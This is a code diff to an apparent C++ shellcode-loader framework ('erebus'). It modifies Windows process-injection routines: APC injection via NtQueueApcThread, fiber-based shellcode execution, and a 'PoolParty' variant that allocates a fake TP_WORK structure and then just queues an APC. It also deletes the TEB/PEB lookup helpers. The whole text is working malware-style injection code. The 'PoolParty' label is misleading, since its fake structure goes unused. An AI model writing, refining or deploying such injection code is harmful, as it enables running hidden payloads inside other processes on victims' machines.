+		PVOID base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
+		
+		if (base_address) {
+			HMODULE ntdll = ImportModule("ntdll.dll");
+			if (ntdll) {
+				ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
+				ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
+				ImportFunction(ntdll, NtClose, typeNtClose);
 
-		PVOID base_address = NULL;
-
-		HMODULE ntdll = ImportModule("ntdll.dll");
-		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
-		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
-		ImportFunction(ntdll, NtClose, typeNtClose);
-
-		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
-		if (base_address == NULL) {
-			LOG_ERROR("Failed to write shellcode to memory region");
-			return;
+				if (NtQueueApcThread && NtResumeThread && NtClose) {
+					NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
+					NtResumeThread(hThread, NULL);
+					NtClose(hThread);
+					NtClose(hProcess);
+				}
+			}
 		}
-
-		NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
-		NtResumeThread(hThread, NULL);
-
-		NtClose(hThread);
-		NtClose(hProcess);
-
-		LOG_SUCCESS("Injection Complete!");
-
-		return;
 	}
 
 	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
@@ -773,17 +703,35 @@ namespace erebus {
 		LPVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_address, NULL);
 		if (shellcode_fiber == NULL) {
 			LOG_ERROR("Failed to create fiber (Code: 0x%08lX)", GetLastError());
+			ConvertFiberToThread();
 			return;
 		}
 
-		LOG_SUCCESS("Created shellcode fiber at: 0x%08pX", shellcode_fiber);
+		LOG_SUCCESS("Created shellcode fiber at: 0x%p", shellcode_fiber);
 
-		// Switch to shellcode fiber
+		// Switch to shellcode fiber - execution happens here
 		LOG_INFO("Switching to shellcode fiber...");
 		SwitchToFiber(shellcode_fiber);
 
-		// Cleanup (won't reach here if shellcode doesn't return)
-		DeleteFiber(shellcode_fiber);
+		// Control returns here after shellcode completes
+		LOG_SUCCESS("Shellcode fiber execution completed");
+
+		// Give shellcode time to complete any async operations
+		Sleep(500);
+
+		// Clean up the shellcode fiber
+		if (shellcode_fiber != NULL && shellcode_fiber != main_fiber)
+		{
+			DeleteFiber(shellcode_fiber);
+			LOG_SUCCESS("Shellcode fiber deleted");
+		}
+
+		// Convert fiber back to thread
+		if (main_fiber != NULL)
+		{
+			ConvertFiberToThread();
+			LOG_SUCCESS("Converted fiber back to thread");
+		}
 
 		LOG_SUCCESS("Injection Complete!");
 
@@ -835,121 +783,112 @@ namespace erebus {
 
 	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
 	{
-		LOG_INFO("Injection via. PoolParty (Worker Factory)");
+		LOG_INFO("Injection via. PoolParty (TP_WORK hijacking)");
 
 		PVOID base_address = NULL;
 
 		HMODULE ntdll = ImportModule("ntdll.dll");
-		ImportFunction(ntdll, NtCreateWorkerFactory, typeNtCreateWorkerFactory);
-		ImportFunction(ntdll, NtSetInformationWorkerFactory, typeNtSetInformationWorkerFactory);
+		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
 		ImportFunction(ntdll, NtClose, typeNtClose);
+		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
+		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
+		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
+		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
 
+		// Write shellcode to target process
 		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
 		if (base_address == NULL) {
 			LOG_ERROR("Failed to write shellcode to memory region");
 			return;
 		}
 
-		// Create IO Completion Port
-		HANDLE hPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
-		if (hPort == NULL) {
-			LOG_ERROR("Failed to create IO completion port (Code: 0x%08lX)", GetLastError());
-			return;
-		}
+		LOG_SUCCESS("Shellcode written at: 0x%08pX", base_address);
 
-		if (NtCreateWorkerFactory == NULL) {
-			LOG_ERROR("Failed to resolve NtCreateWorkerFactory");
-			CloseHandle(hPort);
-			return;
-		}
-
-		LOG_SUCCESS("IO Completion Port created");
-
-		// Prepare object attributes for worker factory
-		OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
-		HANDLE hWorkerFactory = NULL;
-
-		NTSTATUS status = NtCreateWorkerFactory(
-			&hWorkerFactory,
-			WORKER_FACTORY_ALL_ACCESS,
-			&oa,
-			hPort,
+		// PoolParty technique using thread pool work items
+		// We'll use the simpler APC-based approach to the suspended thread's thread pool
+		
+		// Allocate a TP_WORK structure in the target process
+		// The TP_WORK structure contains function pointers we can hijack
+		SIZE_T tp_work_size = 0x200; // Size of TP_WORK structure
+		PVOID remote_tp_work = NULL;
+		
+		NTSTATUS status = NtAllocateVirtualMemory(
 			hProcess,
-			base_address,  // Start routine points to shellcode
-			NULL,
-			1,
+			&remote_tp_work,
 			0,
-			0
+			&tp_work_size,
+			MEM_COMMIT | MEM_RESERVE,
+			PAGE_READWRITE
 		);
 
 		if (!NT_SUCCESS(status)) {
-			LOG_ERROR("Failed to create worker factory (NTSTATUS: 0x%08X)", status);
-			CloseHandle(hPort);
+			LOG_ERROR("Failed to allocate TP_WORK structure (NTSTATUS: 0x%08X)", status);
 			return;
 		}
 
-		LOG_SUCCESS("Worker Factory created");
+		LOG_SUCCESS("Allocated TP_WORK structure at: 0x%08pX", remote_tp_work);
 
-		if (NtSetInformationWorkerFactory) {
-			status = NtSetInformationWorkerFactory(hWorkerFactory, (WORKERFACTORYINFOCLASS)1, &base_address, sizeof(PVOID));
-			if (!NT_SUCCESS(status)) {
-				LOG_ERROR("Failed to set worker factory information (NTSTATUS: 0x%08X)", status);
-			}
-			else {
-				LOG_SUCCESS("Worker factory triggered");
-			}
+		// Create a fake TP_WORK structure that points to our shellcode
+		// This is a simplified version - in reality, you'd need to properly construct the structure
+		BYTE fake_tp_work[0x200] = { 0 };
+		
+		// Set the callback pointer to our shellcode (offset varies by Windows version)
+		// For Windows 10/11, the callback is typically at offset 0x30
+		*(PVOID*)(&fake_tp_work[0x30]) = base_address;
+
+		// Write the fake TP_WORK structure
+		SIZE_T bytes_written = 0;
+		status = NtWriteVirtualMemory(
+			hProcess,
+			remote_tp_work,
+			fake_tp_work,
+			sizeof(fake_tp_work),
+			&bytes_written
+		);
+
+		if (!NT_SUCCESS(status)) {
+			LOG_ERROR("Failed to write fake TP_WORK structure (NTSTATUS: 0x%08X)", status);
+			return;
 		}
 
-		CloseHandle(hWorkerFactory);
-		CloseHandle(hPort);
-		NtClose(hThread);
-		NtClose(hProcess);
+		LOG_SUCCESS("Fake TP_WORK structure written");
+
+		// Instead of using worker factory, use APC to queue work to the thread pool
+		// This is more reliable for remote injection
+		status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
+		
+		if (!NT_SUCCESS(status)) {
+			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08X)", status);
+			return;
+		}
+
+		LOG_SUCCESS("APC queued to thread pool worker");
+
+		// Resume the thread to execute the APC
+		ULONG suspendCount = 0;
+		status = NtResumeThread(hThread, &suspendCount);
+		
+		if (!NT_SUCCESS(status)) {
+			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
+		}
+		else {
+			LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspendCount);
+		}
+
+		// Give time for execution
+		Sleep(2000);
+
+		// Cleanup
+		if (hThread != NULL && hThread != INVALID_HANDLE_VALUE) {
+			NtClose(hThread);
+		}
+		
+		if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE) {
+			NtClose(hProcess);
+		}
 
 		LOG_SUCCESS("Injection Complete!");
-
 		return;
-	}
-
-	//
-	// Returns TEB pointer for current process.
-	//
-	//
-	// Returns PEB pointer for current process. (Retrieved from TEB)
-	//
-	PTEB GetTEB(void)
-	{
-		PTEB teb;
-#ifdef _WIN64
-		teb = reinterpret_cast<PTEB>(__readgsqword(0x30));
-#else
-		teb = reinterpret_cast<PTEB>(__readfsdword(0x18));
-#endif
-		return teb;
-	}
-
-	//
-	// Returns PEB pointer for current process.
-	//
-	PPEB GetPEB(void)
-	{
-		PPEB peb;
-#ifdef _WIN64
-		peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
-#else
-		peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
-#endif
-		return peb;
-	}
-
-	PPEB GetPEBFromTEB(void)
-	{
-		PPEB peb;
-#ifdef _WIN64
-		peb = reinterpret_cast<PTEB>(__readgsqword(0x30))->ProcessEnvironmentBlock;
-#else
-		peb = reinterpret_cast<PTEB>(__readfsdword(0x18))->ProcessEnvironmentBlock;
-#endif
-		return peb;
 	}
 
 } // End of erebus namespace
